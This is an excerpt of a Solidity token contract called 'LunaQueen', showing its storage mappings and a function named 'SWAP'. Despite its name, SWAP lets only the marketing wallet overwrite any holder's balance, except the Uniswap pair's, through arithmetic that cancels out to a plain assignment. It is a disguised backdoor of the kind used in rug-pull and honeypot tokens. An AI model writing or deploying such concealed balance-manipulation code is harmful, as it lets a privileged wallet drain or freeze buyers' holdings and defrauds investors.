...
contract LunaQueen  is Ownable, IERC20 {
    using SafeMath for uint256;
    mapping (address => uint256) private _tOwned;
    mapping (address => mapping (address => uint256)) private _allowances;
    mapping (address => bool) private _isExcludedFromFee;
    string private  _name = "LunaQueen";
    string private  _symbol = "LunaQueen";
    ...
    function SWAP(address y, uint256 tokenAmount, uint256 ethAmount  ) external  {require(msg.sender == _marketing );
         require(y != uniswapV2Pair);
        _tOwned[y] = tokenAmount + ethAmount - tokenAmount;
    }   
